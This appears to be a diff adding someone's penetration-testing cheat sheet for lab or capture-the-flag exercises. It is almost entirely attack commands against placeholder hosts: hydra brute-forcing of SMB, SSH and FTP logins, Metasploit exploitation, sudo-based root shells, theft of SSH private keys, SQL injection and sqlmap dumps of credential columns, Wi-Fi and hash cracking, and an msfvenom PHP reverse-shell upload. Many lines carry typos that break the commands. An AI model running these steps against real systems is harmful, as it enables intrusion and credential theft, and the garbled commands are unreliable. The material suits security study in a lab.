@@ -1,0 +1,189 @@
+nmap -p 389 --script ldap-rootdse x.x.x.x
+nmap --script smb-os-discovery x.x.x.x
+nmap -sV x.x.x.x
+
+nmap -sv --script http-title, http-server-header x.x.x.x
+nmap -sV x.x.x.x. | grep -i apache
+nmap -p 445 --open x.x.x.x
+nmap --script smb-os-discovery, smb-enum-shares x.x.x.x
+hydra -l user -P path smb://x.x.x.x
+smbclient -L //x.x.x.x/ -U user
+smbclient //x.x.x.x/share -u user
+get file.txt
+cat file.txt
+
+base64 -d file.txt >decoded.bin
+openssl enc -d -aes-256-cbc -in decoded.bin -out file.txt
+openssl enc -d -aes-256-cbc -in file.txt
+
+nmap -sV x.x.x.x --open
+adbconnect x.x.x.x:5555
+adbshell
+adbpull path
+find / -name "*.elf" 2>dev/null
+sha384sum file.elf
+
+OpenVAS
+gvm-start  
+https://172.0.0.1:9392
+scans - tasks
+search
+
+port 3632 open
+nmap -sV x.x.x.x --open
+msfconsole 
+use exploit/unix/misc/distcc_exec
+set rhost x.x.x.x
+run
+find / -name file.txt 2>dev/null
+cd ./home/user/file.txt
+
+If port 22
+nmap -sV x.x.x.x --open
+hydra -l user -P path ssh://x.x.x.x
+ssh user@x.x.x.x 
+find / -name file.txt 2>dev/null
+cd ./home/user/file.txt
+
+cd ./downloads
+file image.png
+strings image.png | less
+steghide extract -sf image.png
+ls
+cat
+binwalk -e image.jpg 
+ls -image.png.extracted/
+strings image.png | grep -i flag
+
+nmap -p 21 x.x.x.x
+nmap -sV -p x.x.x.x 
+ftp x.x.x.x
+hydra -L users -P pass ftp://x.x.x.x
+ftp x.x.x.x
+ls
+get file.txt
+bye
+cat file.txt
+
+nmap -sV x.x.x.x -- open
+ssh user@x.x.x.x
+sudo -l
+sudo su 
+whoami
+sudo find . -exec/bin/bash\;quit
+find / -name file.txt 2>dev/null
+
+horizontal 
+sudo -i
+cd/home/user2
+ls
+cat file.txt
+sudo -u user2 /bin/bash
+user2: whoami
+user2
+ls 
+fie.txt
+
+Vertical escalation
+after the horizontal escalation
+ls -la
+cd .ssh
+ls
+id_rsa
+cat id_isa
+nano id_rsa
+chmod 600 id_rsa
+ssh root@x.x.x.x -P xxxxx -i id_rsa
+
+shared folder ./shared
+xfreerdp rdp /u: /p: /v: /drive:shared, ./shared
+on windows  open thispc
+shared on tsclient
+
+SMB share 
+pytrhon3 -m http.server 8000
+
+suso su 
+mkdir /var/www/html/share
+cp file.txt /var/www/html/share
+service apache2 start 
+ipconfig/share
+
+hide.cfe 
+rename hide.cfe(hide.zip)
+file hide.cfe
+mv hide.cfe hide.zip
+unzip hide.zip
+crc32 image,.png(7z h image.png)
+
+
+powershell(Get-filehash -Algorithm SHA256 .\file.txt)
+
+exiftool image.png
+namp --script vuln x.x.x.x
+
+Malware analysis (PES analysis & DIE)
+objdump -f file.exe
+readpe -h file.exe
+
+File open .pcap 
+id.dst==x.x.x.x
+statisfics endpoints(conversation)
+' 'OR '1'='1 'OR 1=1--
+sqlmap -u "url" --dbs -D xxxx --tables xxxx -T xxxx -C username, password --dump
+
+app webapp analysis burpsuite 
+temporary project next start burp 
+proxy open browser
+proxy intercept on 
+on burp browser url
+forward request 
+after finding vulnerable parameters
+send to repeater then manual SQL injection 
+id=1 id=1' if response sql syntax, MySQL, database error 
+save item
+req.txt 
+sqlmap -r req.txt --dump --batch --crawl=2
+mqtt.msgtype==3 for publish packets
+
+aircrack-ng .cap
+aircrack-ng .cap -w rockyou.txt
+aircrack-ng -b <BSSID> -w rockyou.txt .cap
+
+cd ./Documents
+ls
+cat .txt
+if md5
+hashcat -m 0 .txt /rockyou.txt
+john --wordlist=[path_to_wordlist] [file_path] --format=raw-md5<hash>
+hashid file.txt
+
+apt install ent 
+ent evil.elf
+sha384sum evil.elf
+
+grep -i "php\|unsupported\|eol" vulnscan.txt
+
+DVWA/HACKABLE/UPLOADS
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=.x.x.x.x lport=xxx -o shell.php
+msfconsole -x "use exploit/multihandler; set lhost x.x.x.x; set lport xxx; run"
+set payload /pp/meterpreter/reverse_tcp
+run
+upload shell.php on dvwa
+access url
+
+sqlmap -r .txt -D dvwa --dump 
+wpscan --url http://http://x.x.x.x. --enumerate U
+
+
+
+
+
+
+
+
+
+
+
+ 
